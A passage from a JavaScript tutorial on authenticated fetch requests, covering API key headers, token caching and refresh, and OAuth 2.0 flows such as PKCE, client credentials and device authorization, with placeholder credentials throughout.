  constructor(tokenFetcher, cacheDuration = 3600000) {
    this.tokenFetcher = tokenFetcher;
    this.cacheDuration = cacheDuration;
    this.cachedToken = null;
    this.cacheTimestamp = null;
  }

  async getToken() {
    const now = Date.now();
    
    if (
      this.cachedToken &&
      this.cacheTimestamp &&
      (now - this.cacheTimestamp) < this.cacheDuration
    ) {
      return this.cachedToken;
    }

    this.cachedToken = await this.tokenFetcher();
    this.cacheTimestamp = now;
    
    return this.cachedToken;
  }

  invalidate() {
    this.cachedToken = null;
    this.cacheTimestamp = null;
  }
}

const tokenProvider = new CachedTokenProvider(
  () => fetch('/api/token').then(r => r.json()).then(d => d.token)
);
```

#### Request Deduplication

```javascript
class RequestDeduplicator {
  constructor() {
    this.pendingRequests = new Map();
  }

  async fetch(url, options = {}) {
    const key = `${options.method || 'GET'}:${url}`;
    
    if (this.pendingRequests.has(key)) {
      // Return existing promise for identical request
      return this.pendingRequests.get(key);
    }

    const promise = fetch(url, options)
      .finally(() => {
        this.pendingRequests.delete(key);
      });

    this.pendingRequests.set(key, promise);
    return promise;
  }
}

const deduplicator = new RequestDeduplicator();

// Multiple identical calls will only result in one network request
Promise.all([
  deduplicator.fetch(url, { headers: { 'Authorization': `Bearer ${token}` }}),
  deduplicator.fetch(url, { headers: { 'Authorization': `Bearer ${token}` }}),
  deduplicator.fetch(url, { headers: { 'Authorization': `Bearer ${token}` }})
]);
```

---

## API Keys

### Sending API Keys in Headers

API keys are typically sent via the `Authorization` header or custom headers specified by the API provider.

```javascript
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': 'Bearer YOUR_API_KEY_HERE',
    'Content-Type': 'application/json'
  }
})
```

#### Common Header Patterns

Different APIs use different header conventions:

```javascript
// Bearer token (OAuth 2.0, JWT)
headers: {
  'Authorization': 'Bearer sk-1234567890abcdef'
}

// API key in custom header
headers: {
  'X-API-Key': 'your-api-key',
  'Api-Key': 'your-api-key'
}

// Basic Authentication
headers: {
  'Authorization': 'Basic ' + btoa('username:password')
}

// Token prefix variations
headers: {
  'Authorization': 'Token your-api-key',
  'Authorization': 'ApiKey your-api-key'
}
```

### Query Parameter Authentication

Some APIs accept keys as URL parameters (less secure, avoid for sensitive operations):

```javascript
const apiKey = 'your-api-key';
const url = `https://api.example.com/data?api_key=${apiKey}`;

fetch(url)
  .then(response => response.json())
  .then(data => console.log(data));
```

### Environment Variables for API Keys

Never hardcode API keys. Use environment variables:

```javascript
// In Node.js
const API_KEY = process.env.API_KEY;

fetch('https://api.example.com/data', {
  headers: {
    'Authorization': `Bearer ${API_KEY}`
  }
})

// In browser with build tools (Vite, webpack)
const API_KEY = import.meta.env.VITE_API_KEY; // Vite
const API_KEY = process.env.REACT_APP_API_KEY; // Create React App

fetch('https://api.example.com/data', {
  headers: {
    'Authorization': `Bearer ${API_KEY}`
  }
})
```

### OAuth 2.0 Flow with Fetch

#### Authorization Code Flow

```javascript
// Step 1: Redirect user to authorization URL
const authUrl = `https://oauth-provider.com/authorize?` +
  `client_id=${CLIENT_ID}&` +
  `redirect_uri=${REDIRECT_URI}&` +
  `response_type=code&` +
  `scope=read write`;

window.location.href = authUrl;

// Step 2: Exchange authorization code for access token
async function exchangeCodeForToken(code) {
  const response = await fetch('https://oauth-provider.com/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code: code,
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      redirect_uri: REDIRECT_URI
    })
  });

  const data = await response.json();
  return data.access_token;
}

// Step 3: Use access token
async function fetchProtectedResource(accessToken) {
  const response = await fetch('https://api.example.com/protected', {
    headers: {
      'Authorization': `Bearer ${accessToken}`
    }
  });
  
  return response.json();
}
```

#### Client Credentials Flow

```javascript
async function getClientCredentialsToken() {
  const response = await fetch('https://oauth-provider.com/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Authorization': 'Basic ' + btoa(`${CLIENT_ID}:${CLIENT_SECRET}`)
    },
    body: new URLSearchParams({
      grant_type: 'client_credentials',
      scope: 'api.read api.write'
    })
  });

  const data = await response.json();
  return data.access_token;
}
```

### Token Refresh Pattern

```javascript
class AuthenticatedFetch {
  constructor(baseUrl, clientId, clientSecret) {
    this.baseUrl = baseUrl;
    this.clientId = clientId;
    this.clientSecret = clientSecret;
    this.accessToken = null;
    this.refreshToken = null;
    this.tokenExpiry = null;
  }

  async refreshAccessToken() {
    const response = await fetch('https://oauth-provider.com/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams({
        grant_type: 'refresh_token',
        refresh_token: this.refreshToken,
        client_id: this.clientId,
        client_secret: this.clientSecret
      })
    });

    const data = await response.json();
    this.accessToken = data.access_token;
    this.refreshToken = data.refresh_token || this.refreshToken;
    this.tokenExpiry = Date.now() + (data.expires_in * 1000);
    
    return this.accessToken;
  }

  async fetch(endpoint, options = {}) {
    // Check if token needs refresh
    if (!this.accessToken || Date.now() >= this.tokenExpiry - 60000) {
      await this.refreshAccessToken();
    }

    const response = await fetch(`${this.baseUrl}${endpoint}`, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${this.accessToken}`
      }
    });

    // Handle 401 by refreshing token and retrying once
    if (response.status === 401) {
      await this.refreshAccessToken();
      return fetch(`${this.baseUrl}${endpoint}`, {
        ...options,
        headers: {
          ...options.headers,
          'Authorization': `Bearer ${this.accessToken}`
        }
      });
    }

    return response;
  }
}

// Usage
const api = new AuthenticatedFetch(
  'https://api.example.com',
  'client-id',
  'client-secret'
);

const data = await api.fetch('/users').then(r => r.json());
```

### JWT (JSON Web Token) Authentication

```javascript
// Decoding JWT (client-side inspection only, NOT validation)
function parseJwt(token) {
  const base64Url = token.split('.')[1];
  const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
  const jsonPayload = decodeURIComponent(
    atob(base64).split('').map(c => {
      return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join('')
  );
  return JSON.parse(jsonPayload);
}

// Check token expiry before making request
function isTokenExpired(token) {
  const decoded = parseJwt(token);
  return decoded.exp * 1000 < Date.now();
}

// Fetch with JWT
async function fetchWithJWT(url, token) {
  if (isTokenExpired(token)) {
    token = await refreshJWT();
  }

  return fetch(url, {
    headers: {
      'Authorization': `Bearer ${token}`
    }
  });
}
```

### API Key Rotation Strategy

```javascript
class APIKeyManager {
  constructor(primaryKey, secondaryKey = null) {
    this.primaryKey = primaryKey;
    this.secondaryKey = secondaryKey;
    this.usePrimary = true;
  }

  getCurrentKey() {
    return this.usePrimary ? this.primaryKey : this.secondaryKey;
  }

  async fetchWithFallback(url, options = {}) {
    const attemptFetch = async (apiKey) => {
      return fetch(url, {
        ...options,
        headers: {
          ...options.headers,
          'Authorization': `Bearer ${apiKey}`
        }
      });
    };

    let response = await attemptFetch(this.getCurrentKey());

    // If primary fails with 401/403 and secondary exists, try secondary
    if ((response.status === 401 || response.status === 403) && this.secondaryKey) {
      this.usePrimary = !this.usePrimary;
      response = await attemptFetch(this.getCurrentKey());
    }

    return response;
  }

  rotateKeys(newPrimaryKey) {
    this.secondaryKey = this.primaryKey;
    this.primaryKey = newPrimaryKey;
    this.usePrimary = true;
  }
}
```

### Rate Limiting with Authentication

```javascript
class RateLimitedFetch {
  constructor(apiKey, requestsPerSecond = 10) {
    this.apiKey = apiKey;
    this.minInterval = 1000 / requestsPerSecond;
    this.lastRequest = 0;
    this.queue = [];
    this.processing = false;
  }

  async fetch(url, options = {}) {
    return new Promise((resolve, reject) => {
      this.queue.push({ url, options, resolve, reject });
      this.processQueue();
    });
  }

  async processQueue() {
    if (this.processing || this.queue.length === 0) return;
    
    this.processing = true;

    while (this.queue.length > 0) {
      const now = Date.now();
      const timeSinceLastRequest = now - this.lastRequest;

      if (timeSinceLastRequest < this.minInterval) {
        await new Promise(resolve => 
          setTimeout(resolve, this.minInterval - timeSinceLastRequest)
        );
      }

      const { url, options, resolve, reject } = this.queue.shift();
      this.lastRequest = Date.now();

      try {
        const response = await fetch(url, {
          ...options,
          headers: {
            ...options.headers,
            'Authorization': `Bearer ${this.apiKey}`
          }
        });
        resolve(response);
      } catch (error) {
        reject(error);
      }
    }

    this.processing = false;
  }
}

// Usage
const api = new RateLimitedFetch('your-api-key', 5); // 5 requests per second
const response = await api.fetch('https://api.example.com/data');
```

### Handling Authentication Errors

```javascript
async function fetchWithAuth(url, apiKey) {
  const response = await fetch(url, {
    headers: {
      'Authorization': `Bearer ${apiKey}`
    }
  });

  switch (response.status) {
    case 401:
      throw new Error('Unauthorized: Invalid or expired API key');
    
    case 403:
      throw new Error('Forbidden: Insufficient permissions');
    
    case 429:
      const retryAfter = response.headers.get('Retry-After');
      throw new Error(`Rate limited. Retry after ${retryAfter} seconds`);
    
    case 200:
    case 201:
      return response.json();
    
    default:
      throw new Error(`Request failed with status ${response.status}`);
  }
}

// With retry logic
async function fetchWithRetry(url, apiKey, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fetchWithAuth(url, apiKey);
    } catch (error) {
      if (error.message.includes('Rate limited') && i < maxRetries - 1) {
        const match = error.message.match(/\d+/);
        const waitTime = match ? parseInt(match[0]) * 1000 : 1000 * (i + 1);
        await new Promise(resolve => setTimeout(resolve, waitTime));
        continue;
      }
      throw error;
    }
  }
}
```

### Secure Storage of Tokens

```javascript
// Browser: Use sessionStorage or memory (never localStorage for sensitive tokens)
class TokenStorage {
  constructor() {
    this.token = null; // In-memory storage
  }

  setToken(token) {
    this.token = token;
    // Or for session persistence:
    // sessionStorage.setItem('auth_token', token);
  }

  getToken() {
    return this.token;
    // Or: return sessionStorage.getItem('auth_token');
  }

  clearToken() {
    this.token = null;
    // sessionStorage.removeItem('auth_token');
  }
}

// For sensitive applications, implement token encryption
async function encryptToken(token, password) {
  const enc = new TextEncoder();
  const keyMaterial = await crypto.subtle.importKey(
    'raw',
    enc.encode(password),
    { name: 'PBKDF2' },
    false,
    ['deriveBits', 'deriveKey']
  );

  const key = await crypto.subtle.deriveKey(
    {
      name: 'PBKDF2',
      salt: enc.encode('salt-value'),
      iterations: 100000,
      hash: 'SHA-256'
    },
    keyMaterial,
    { name: 'AES-GCM', length: 256 },
    false,
    ['encrypt', 'decrypt']
  );

  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    enc.encode(token)
  );

  return { encrypted, iv };
}
```

### Multi-Service Authentication Handler

```javascript
class MultiServiceAuth {
  constructor() {
    this.services = new Map();
  }

  addService(name, config) {
    this.services.set(name, {
      apiKey: config.apiKey,
      baseUrl: config.baseUrl,
      authType: config.authType || 'bearer',
      headerName: config.headerName || 'Authorization'
    });
  }

  async fetch(serviceName, endpoint, options = {}) {
    const service = this.services.get(serviceName);
    if (!service) {
      throw new Error(`Service ${serviceName} not configured`);
    }

    const authHeader = this.buildAuthHeader(service);
    
    return fetch(`${service.baseUrl}${endpoint}`, {
      ...options,
      headers: {
        ...options.headers,
        [service.headerName]: authHeader
      }
    });
  }

  buildAuthHeader(service) {
    switch (service.authType) {
      case 'bearer':
        return `Bearer ${service.apiKey}`;
      case 'basic':
        return `Basic ${btoa(service.apiKey)}`;
      case 'token':
        return `Token ${service.apiKey}`;
      case 'apikey':
        return service.apiKey;
      default:
        return service.apiKey;
    }
  }
}

// Usage
const auth = new MultiServiceAuth();

auth.addService('github', {
  apiKey: 'ghp_xxxxx',
  baseUrl: 'https://api.github.com',
  authType: 'bearer'
});

auth.addService('stripe', {
  apiKey: 'sk_test_xxxxx',
  baseUrl: 'https://api.stripe.com',
  authType: 'bearer'
});

// Make authenticated requests
const repos = await auth.fetch('github', '/user/repos').then(r => r.json());
const customers = await auth.fetch('stripe', '/v1/customers').then(r => r.json());
```

### CORS and Preflight Requests with Authentication

```javascript
// Custom headers trigger preflight requests
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer your-token', // Triggers preflight
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify({ data: 'value' })
})

// Server must respond to OPTIONS request with:
// Access-Control-Allow-Origin: https://your-domain.com
// Access-Control-Allow-Methods: POST, GET, OPTIONS
// Access-Control-Allow-Headers: Authorization, Content-Type, X-Custom-Header
// Access-Control-Allow-Credentials: true (if using cookies)
```

### Proxy Pattern for API Key Protection

```javascript
// Frontend: Never expose API keys
async function fetchThroughProxy(endpoint, options = {}) {
  // Call your backend proxy instead of external API directly
  return fetch(`/api/proxy${endpoint}`, {
    ...options,
    credentials: 'include' // Include session cookies
  });
}

// Backend proxy (Node.js/Express example concept)
// app.post('/api/proxy/*', authenticate, async (req, res) => {
//   const externalUrl = `https://external-api.com${req.params[0]}`;
//   const response = await fetch(externalUrl, {
//     method: req.method,
//     headers: {
//       'Authorization': `Bearer ${process.env.API_KEY}`,
//       'Content-Type': 'application/json'
//     },
//     body: JSON.stringify(req.body)
//   });
//   const data = await response.json();
//   res.json(data);
// });
```

### API Key Security Best Practices

```javascript
// ❌ NEVER DO THIS
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': 'Bearer sk-1234567890' // Hardcoded key
  }
})

// ❌ NEVER expose keys in client-side code
const API_KEY = 'sk-1234567890';

// ❌ NEVER commit keys to version control
// Check .gitignore includes .env files

// ✅ DO THIS
// Use environment variables
const API_KEY = process.env.API_KEY;

// ✅ Use backend proxy for sensitive keys
// ✅ Rotate keys regularly
// ✅ Use different keys for dev/staging/production
// ✅ Implement key expiration and refresh
// ✅ Monitor API usage for anomalies
// ✅ Use minimal scopes/permissions
// ✅ Store tokens in memory or secure session storage, not localStorage
```

### Authentication State Management

```javascript
class AuthManager {
  constructor() {
    this.token = null;
    this.user = null;
    this.listeners = [];
  }

  async login(credentials) {
    const response = await fetch('https://api.example.com/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(credentials)
    });

    const data = await response.json();
    this.token = data.token;
    this.user = data.user;
    this.notifyListeners({ type: 'login', user: this.user });
    
    return data;
  }

  async logout() {
    await fetch('https://api.example.com/logout', {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${this.token}` }
    });

    this.token = null;
    this.user = null;
    this.notifyListeners({ type: 'logout' });
  }

  async authenticatedFetch(url, options = {}) {
    if (!this.token) {
      throw new Error('Not authenticated');
    }

    return fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${this.token}`
      }
    });
  }

  subscribe(listener) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }

  notifyListeners(event) {
    this.listeners.forEach(listener => listener(event));
  }

  isAuthenticated() {
    return !!this.token;
  }
}

// Usage
const auth = new AuthManager();

auth.subscribe(event => {
  if (event.type === 'logout') {
    window.location.href = '/login';
  }
});

await auth.login({ username: 'user', password: 'pass' });
const data = await auth.authenticatedFetch('/api/protected').then(r => r.json());
```

---

## OAuth 2.0 Flows

### Authorization Code Flow

The authorization code flow is the most secure OAuth 2.0 flow for server-side applications. The process involves exchanging an authorization code for tokens.

#### Initial Authorization Request

The client redirects the user to the authorization server. This typically happens via a standard link or redirect, not fetch:

```javascript
const authUrl = new URL('https://authorization-server.com/oauth/authorize');
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('client_id', 'your_client_id');
authUrl.searchParams.set('redirect_uri', 'https://your-app.com/callback');
authUrl.searchParams.set('scope', 'read write');
authUrl.searchParams.set('state', generateRandomState());

window.location.href = authUrl.toString();
```

#### Token Exchange Request

After receiving the authorization code in the callback, exchange it for tokens:

```javascript
async function exchangeCodeForToken(code) {
  const response = await fetch('https://authorization-server.com/oauth/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': 'application/json'
    },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code: code,
      redirect_uri: 'https://your-app.com/callback',
      client_id: 'your_client_id',
      client_secret: 'your_client_secret'
    })
  });

  if (!response.ok) {
    const error = await response.json();
    throw new Error(`Token exchange failed: ${error.error_description}`);
  }

  const tokens = await response.json();
  // tokens contains: access_token, refresh_token, expires_in, token_type
  return tokens;
}
```

#### PKCE Extension

PKCE (Proof Key for Code Exchange) adds security for public clients:

```javascript
// Generate code verifier and challenge
function generateCodeVerifier() {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return base64URLEncode(array);
}

async function generateCodeChallenge(verifier) {
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return base64URLEncode(new Uint8Array(hash));
}

function base64URLEncode(buffer) {
  return btoa(String.fromCharCode(...buffer))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

// Authorization request with PKCE
const codeVerifier = generateCodeVerifier();
const codeChallenge = await generateCodeChallenge(codeVerifier);

const authUrl = new URL('https://authorization-server.com/oauth/authorize');
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('code_challenge', codeChallenge);
authUrl.searchParams.set('code_challenge_method', 'S256');
// ... other parameters

// Token exchange with PKCE
async function exchangeWithPKCE(code, verifier) {
  const response = await fetch('https://authorization-server.com/oauth/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code: code,
      redirect_uri: 'https://your-app.com/callback',
      client_id: 'your_client_id',
      code_verifier: verifier
    })
  });

  return await response.json();
}
```

### Implicit Flow

[Unverified: The implicit flow is deprecated in OAuth 2.0 Security Best Current Practice (BCP), but may still be encountered in legacy systems]

The implicit flow returns tokens directly from the authorization endpoint without an intermediate code exchange:

```javascript
// Authorization request
const authUrl = new URL('https://authorization-server.com/oauth/authorize');
authUrl.searchParams.set('response_type', 'token');
authUrl.searchParams.set('client_id', 'your_client_id');
authUrl.searchParams.set('redirect_uri', 'https://your-app.com/callback');
authUrl.searchParams.set('scope', 'read');
authUrl.searchParams.set('state', generateRandomState());

window.location.href = authUrl.toString();

// Parse token from URL fragment
function parseTokenFromFragment() {
  const hash = window.location.hash.substring(1);
  const params = new URLSearchParams(hash);
  
  return {
    access_token: params.get('access_token'),
    token_type: params.get('token_type'),
    expires_in: params.get('expires_in'),
    state: params.get('state')
  };
}
```

### Client Credentials Flow

Used for machine-to-machine authentication where no user is involved:

```javascript
async function getClientCredentialsToken() {
  const credentials = btoa(`${clientId}:${clientSecret}`);
  
  const response = await fetch('https://authorization-server.com/oauth/token', {
    method: 'POST',
    headers: {
      'Authorization': `Basic ${credentials}`,
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'client_credentials',
      scope: 'api:read api:write'
    })
  });

  if (!response.ok) {
    throw new Error(`Authentication failed: ${response.status}`);
  }

  return await response.json();
}

// Alternative: credentials in body
async function getClientCredentialsTokenBodyAuth() {
  const response = await fetch('https://authorization-server.com/oauth/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'client_credentials',
      client_id: 'your_client_id',
      client_secret: 'your_client_secret',
      scope: 'api:read api:write'
    })
  });

  return await response.json();
}
```

### Resource Owner Password Credentials Flow

[Unverified: This flow is also deprecated in OAuth 2.0 Security BCP due to security concerns]

Direct exchange of username and password for tokens:

```javascript
async function loginWithPassword(username, password) {
  const response = await fetch('https://authorization-server.com/oauth/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'password',
      username: username,
      password: password,
      client_id: 'your_client_id',
      client_secret: 'your_client_secret',
      scope: 'read write'
    })
  });

  if (!response.ok) {
    const error = await response.json();
    throw new Error(`Login failed: ${error.error_description}`);
  }

  return await response.json();
}
```

### Refresh Token Flow

Used to obtain new access tokens without user interaction:

```javascript
async function refreshAccessToken(refreshToken) {
  const response = await fetch('https://authorization-server.com/oauth/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'refresh_token',
      refresh_token: refreshToken,
      client_id: 'your_client_id',
      client_secret: 'your_client_secret'
    })
  });

  if (!response.ok) {
    const error = await response.json();
    if (error.error === 'invalid_grant') {
      // Refresh token expired or revoked - need full re-authentication
      throw new Error('REFRESH_TOKEN_EXPIRED');
    }
    throw new Error(`Token refresh failed: ${error.error_description}`);
  }

  const tokens = await response.json();
  // May include new refresh_token, or reuse the existing one
  return tokens;
}

// Automatic refresh before expiration
class TokenManager {
  constructor(tokens) {
    this.accessToken = tokens.access_token;
    this.refreshToken = tokens.refresh_token;
    this.expiresAt = Date.now() + (tokens.expires_in * 1000);
    this.refreshThreshold = 300000; // 5 minutes
  }

  async getValidToken() {
    const timeUntilExpiry = this.expiresAt - Date.now();
    
    if (timeUntilExpiry < this.refreshThreshold) {
      const newTokens = await refreshAccessToken(this.refreshToken);
      this.accessToken = newTokens.access_token;
      if (newTokens.refresh_token) {
        this.refreshToken = newTokens.refresh_token;
      }
      this.expiresAt = Date.now() + (newTokens.expires_in * 1000);
    }
    
    return this.accessToken;
  }
}
```

### Device Authorization Flow

For devices with limited input capabilities:

```javascript
async function initiateDeviceFlow() {
  const response = await fetch('https://authorization-server.com/oauth/device/code', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      client_id: 'your_client_id',
      scope: 'read write'
    })
  });

  const data = await response.json();
  // Returns: device_code, user_code, verification_uri, expires_in, interval
  return data;
}

async function pollForDeviceToken(deviceCode, interval = 5) {
  const pollInterval = interval * 1000;
  
  while (true) {
    await new Promise(resolve => setTimeout(resolve, pollInterval));
    
    const response = await fetch('https://authorization-server.com/oauth/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams({
        grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
        device_code: deviceCode,
        client_id: 'your_client_id'
      })
    });

    const data = await response.json();
    
    if (response.ok) {
      return data; // Contains access_token, refresh_token, etc.
    }
    
    if (data.error === 'authorization_pending') {
      continue; // User hasn't authorized yet
    }
    
    if (data.error === 'slow_down') {
      // Increase polling interval
      await new Promise(resolve => setTimeout(resolve, 5000));
      continue;
    }
    
    if (data.error === 'expired_token') {
      throw new Error('Device code expired');
    }
    
    throw new Error(`Device flow failed: ${data.error_description}`);
  }
}

// Usage
async function deviceFlowExample() {
  const deviceAuth = await initiateDeviceFlow();
  
  console.log(`Visit ${deviceAuth.verification_uri}`);
  console.log(`Enter code: ${deviceAuth.user_code}`);
  
  const tokens = await pollForDeviceToken(
    deviceAuth.device_code, 
    deviceAuth.interval
  );
  
  return tokens;
}
```

### Token Introspection

Validate and retrieve metadata about tokens:

```javascript
async function introspectToken(token) {
  const credentials = btoa(`${clientId}:${clientSecret}`);
  
  const response = await fetch('https://authorization-server.com/oauth/introspect', {
    method: 'POST',
    headers: {
      'Authorization': `Basic ${credentials}`,
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      token: token,
      token_type_hint: 'access_token'
    })
  });

  const data = await response.json();
  
  // Response includes: active, scope, client_id, username, exp, iat, etc.
  return data;
}

async function validateToken(token) {
  const introspection = await introspectToken(token);
  
  if (!introspection.active) {
    throw new Error('Token is not active');
  }
  
  if (introspection.exp && introspection.exp < Date.now() / 1000) {
    throw new Error('Token has expired');
  }
  
  return introspection;
}
```

### Token Revocation

Explicitly invalidate tokens:

```javascript
async function revokeToken(token, tokenTypeHint = 'access_token') {
  const credentials = btoa(`${clientId}:${clientSecret}`);
  
  const response = await fetch('https://authorization-server.com/oauth/revoke', {
    method: 'POST',
    headers: {
      'Authorization': `Basic ${credentials}`,
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      token: token,
      token_type_hint: tokenTypeHint
    })
  });

  // Revocation endpoint returns 200 even if token was already invalid
  if (!response.ok) {
    throw new Error(`Revocation failed: ${response.status}`);
  }
}

async function logout(accessToken, refreshToken) {
  // Revoke both tokens
  await revokeToken(refreshToken, 'refresh_token');
  await revokeToken(accessToken, 'access_token');
  
  // Clear local storage
  localStorage.removeItem('access_token');
  localStorage.removeItem('refresh_token');
}
```

### Making Authenticated API Requests

Using obtained tokens with fetch:

```javascript
async function makeAuthenticatedRequest(url, token, options = {}) {
  const response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`,
      'Accept': 'application/json'
    }
  });

  if (response.status === 401) {
    throw new Error('UNAUTHORIZED');
  }

  if (!response.ok) {
    throw new Error(`Request failed: ${response.status}`);
  }

  return await response.json();
}

// With automatic token refresh
class AuthenticatedFetch {
  constructor(tokenManager) {
    this.tokenManager = tokenManager;
  }

  async fetch(url, options = {}) {
    const token = await this.tokenManager.getValidToken();
    
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });

    if (response.status === 401) {
      // Token might have been revoked, try refreshing
      await this.tokenManager.getValidToken(true); // Force refresh
      const newToken = await this.tokenManager.getValidToken();
      
      // Retry with new token
      return fetch(url, {
        ...options,
        headers: {
          ...options.headers,
          'Authorization': `Bearer ${newToken}`
        }
      });
    }

    return response;
  }
}
```

### Error Handling

Standardized OAuth 2.0 error responses:

```javascript
class OAuthError extends Error {
  constructor(error, description, uri) {
    super(description || error);
    this.error = error;
    this.description = description;
    this.uri = uri;
  }
}

async function handleOAuthResponse(response) {
  if (!response.ok) {
    const errorData = await response.json();
    throw new OAuthError(
      errorData.error,
      errorData.error_description,
      errorData.error_uri
    );
  }
  return await response.json();
}

// Common error codes
const ERROR_HANDLERS = {
  'invalid_request': (err) => {
    console.error('Malformed request:', err.description);
  },
  'invalid_client': (err) => {
    console.error('Client authentication failed:', err.description);
  },
  'invalid_grant': (err) => {
    console.error('Grant invalid/expired:', err.description);
    // Trigger re-authentication
  },
  'unauthorized_client': (err) => {
    console.error('Client not authorized for this grant type:', err.description);
  },
  'unsupported_grant_type': (err) => {
    console.error('Grant type not supported:', err.description);
  },
  'invalid_scope': (err) => {
    console.error('Requested scope invalid:', err.description);
  }
};

async function safeTokenRequest(url, params) {
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams(params)
    });

    return await handleOAuthResponse(response);
  } catch (error) {
    if (error instanceof OAuthError) {
      const handler = ERROR_HANDLERS[error.error];
      if (handler) {
        handler(error);
      }
    }
    throw error;
  }
}
```

### State Parameter Validation

Protecting against CSRF attacks:

```javascript
function generateState() {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

function storeState(state) {
  sessionStorage.setItem('oauth_state', state);
  sessionStorage.setItem('oauth_state_timestamp', Date.now().toString());
}

function validateState(receivedState) {
  const storedState = sessionStorage.getItem('oauth_state');
  const timestamp = sessionStorage.getItem('oauth_state_timestamp');
  
  // Clear stored state
  sessionStorage.removeItem('oauth_state');
  sessionStorage.removeItem('oauth_state_timestamp');
  
  if (!storedState) {
    throw new Error('No state found in session');
  }
  
  // Check state hasn't expired (5 minutes)
  if (Date.now() - parseInt(timestamp) > 300000) {
    throw new Error('State has expired');
  }
  
  if (storedState !== receivedState) {
    throw new Error('State mismatch - possible CSRF attack');
  }
  
  return true;
}

// Usage in callback
function handleCallback() {
  const params = new URLSearchParams(window.location.search);
  const code = params.get('code');
  const state = params.get('state');
  const error = params.get('error');
  
  if (error) {
    throw new Error(`Authorization failed: ${error}`);
  }
  
  validateState(state);
  
  return exchangeCodeForToken(code);
}
```

### Scope Management

Handling OAuth 2.0 scopes:

```javascript
class ScopeManager {
  constructor(grantedScopes) {
    this.scopes = new Set(grantedScopes.split(' '));
  }

  has(scope) {
    return this.scopes.has(scope);
  }

  hasAll(...requiredScopes) {
    return requiredScopes.every(scope => this.scopes.has(scope));
  }

  hasAny(...requiredScopes) {
    return requiredScopes.some(scope => this.scopes.has(scope));
  }

  toString() {
    return Array.from(this.scopes).join(' ');
  }
}

async function requestWithScopes(url, requiredScopes, tokenManager) {
  const token = await tokenManager.getValidToken();
  const tokenData = await introspectToken(token);
  const scopeManager = new ScopeManager(tokenData.scope);
  
  if (!scopeManager.hasAll(...requiredScopes)) {
    throw new Error(`Missing required scopes: ${requiredScopes.join(', ')}`);
  }
  
  return fetch(url, {
    headers: {
      'Authorization': `Bearer ${token}`
    }
  });
}
```

### Dynamic Client Registration

Programmatically register OAuth clients:

```javascript
async function registerClient(registrationEndpoint, metadata) {
  const response = await fetch(registrationEndpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify({
      client_name: metadata.clientName,
      redirect_uris: metadata.redirectUris,
      grant_types: metadata.grantTypes || ['authorization_code', 'refresh_token'],
      response_types: metadata.responseTypes || ['code'],
      token_endpoint_auth_method: metadata.authMethod || 'client_secret_basic',
      scope: metadata.scope,
      logo_uri: metadata.logoUri,
      contacts: metadata.contacts
    })
  });

  if (!response.ok) {
    throw new Error(`Registration failed: ${response.status}`);
  }

  const registration = await response.json();
  // Returns: client_id, client_secret, registration_access_token, etc.
  return registration;
}

// Update registered client
async function updateClient(registrationEndpoint, clientId, accessToken, updates) {
  const response = await fetch(`${registrationEndpoint}/${clientId}`, {
    method: 'PUT',
    headers: {
      'Authorization': `Bearer ${accessToken}`,
      'Content-Type': 'application/json'
    },
